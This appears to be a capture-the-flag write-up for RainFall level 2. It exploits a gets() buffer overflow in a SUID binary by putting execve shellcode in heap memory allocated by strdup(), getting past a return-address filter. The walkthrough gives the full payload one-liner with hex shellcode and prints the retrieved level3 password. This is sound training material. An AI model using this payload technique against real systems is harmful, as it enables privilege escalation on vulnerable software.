# Level 2 Walkthrough

## Who am I?

```bash
level2@RainFall:~$ id
uid=2021(level2) gid=2021(level2) groups=2021(level2),100(users)
```

## Where am I?

```bash
level2@RainFall:~$ ll
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 ./
dr-x--x--x  1 root   root    340 Sep 23  2015 ../
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2*
```

We are in possession of a SUID binary owned by level3. Our objective is to exploit this binary to gain a shell as level3 and read the corresponding `.pass` file.

## First look at the binary (GDB)

Before running the binary, we open it in GDB to check which functions are defined:

```gdb
(gdb) info functions
...
0x080484d4 p
0x0804853f main
```

We see two user-defined functions of interest: `main()` and `p()`.

Let’s disassemble `main()`:

```gdb
(gdb) disas main
    0x0804853f <+0>: push %ebp
    0x08048540 <+1>: mov %esp,%ebp
    0x08048542 <+3>: and $0xfffffff0,%esp
    0x08048545 <+6>: call 0x80484d4 <p>
    0x0804854a <+11>: leave
    0x0804854b <+12>: ret
```

The main function simply calls `p()`.

Now, disassembling `p()` gives:

```gdb
(gdb) disas p
    ...
    call 0x80483c0 <gets@plt>
    ...
    call 0x80483f0 <puts@plt>
    ... call 0x80483e0 <strdup@plt>
```

We immediately notice the use of the insecure `gets()` function and that the input is printed and copied using `puts()` and `strdup()` respectively. This sets the stage for a possible buffer overflow exploit.

## Program Behavior

The program accepts input from stdin, prints it back, and exits.

```bash
level2@RainFall:~$ ./level2
test
test
```

But when given a longer input:

```bash
level2@RainFall:~$ ./level2
<100+ characters>
Segmentation fault (core dumped)
```

This crash strongly suggests the presence of a buffer overflow.

## Exploitation Strategy

### Step 1: Discover the overflow offset

We generate a cyclic pattern of 100 bytes:

```bash
$ msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5...
```

Then launch the binary inside GDB:

```gdb
(gdb) run
Aa0Aa1Aa2Aa3Aa4Aa5...
Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) info registers eip
eip            0x37634136       0x37634136
```

We find the offset:

```bash
$ msf-pattern_offset -q 0x37634136
[*] Exact match at offset 80
```

So it takes **80 bytes** to reach EIP.

### Step 2: Understand the program's filter

Using Ghidra, we decompiled the binary and observed the following logic in the function `p()`:

```c
if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n", unaff_retaddr);
    _exit(1);
}
```

**Note:** The variable `unaff_retaddr` does not appear in the source code. This is a name automatically generated by Ghidra to represent the return address saved on the stack. Internally, the program likely retrieves this using a compiler intrinsic such as `__builtin_return_address(0)`.

This check verifies whether the return address (i.e., the address where execution would continue after the function ends) starts with `0xb`, which corresponds to stack memory on this system (e.g., `0xbfxxxxxx`).

If the return address points to the stack, the program prints it and exits immediately. This effectively blocks stack-based shellcode. As a result, we must place our shellcode somewhere else, like the heap and redirect execution there instead.

### Step 3: Determine a usable memory region

At this point, we know that jumping to the stack is forbidden. To successfully exploit the binary, we need to redirect execution to a region where we can inject shellcode that won't be rejected by the address check.

The heap is a good candidate because memory allocations via `malloc()` (used indirectly by `strdup()`) are typically located in the `0x0804xxxx` range, which does not begin with `0xb`.

We will now verify where the heap allocation occurs.

### Step 4: Identify the heap allocation address


After entering input, the program stores a copy of it using `strdup()`, which allocates memory on the heap. This is important because, due to the return address filter (see Step 2), we cannot execute shellcode on the stack.
`ltrace` is a tool that traces calls to shared libraries (like `libc`). It allows us to observe functions such as `gets`, `strdup`, `malloc`, etc., in real time, without needing symbols or debugging information.

So, to locate where the input gets copied in the heap, we can run the binary with `ltrace`:

```bash
$ ltrace ./level2
fflush(0xb7fd1a20)                                    = 0
gets(0xbffff6fc)                                      = 0xbffff6fc
puts("test")                                          = 5
strdup("test")                                        = 0x0804a008

```

This confirms that our input is copied to the heap at `0x0804a008` via `strdup()`.

Since this address doesn't start with 0xb, it passes the check and is usable for exploitation. This is where we’ll inject our shellcode, and later overwrite the return address to jump here.

### Step 5: Plan the payload layout

At this point, we know:

* We can inject shellcode through standard input.
* It will be stored in the heap via `strdup()` at an address like `0x0804a008`.
* The return address is overwritten at offset 80.

The goal is to:

1. Place shellcode at the beginning of the input so it ends up in the heap.
2. Pad the rest of the input up to 80 bytes.
3. Overwrite the return address with the address of the shellcode in the heap.

We can now move on to crafting the actual payload.

### Step 6: Build the exploit payload

* Shellcode (28 bytes): `execve("/bin//sh")` from [https://shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html)
* Padding (52 bytes): to reach EIP at offset 80
* Return address: `0x0804a008` (address of shellcode in heap)

```bash
python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 52 + "\x08\xa0\x04\x08")' > /tmp/exploit
```

### Step 7: Trigger the exploit

To maintain an interactive shell:

```bash
cat /tmp/exploit - | ./level2
```

### Step 8: Validate access

```bash
$ whoami
level3
$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Files in this repository

* `flag.txt`: file containing the retrieved flag
* `asm_analysis.md`: GDB analysis of the binary
* `source/`: contains `ghidra/` (raw Ghidra decompilation) and `clean/` (cleaned C, faithful to binary)

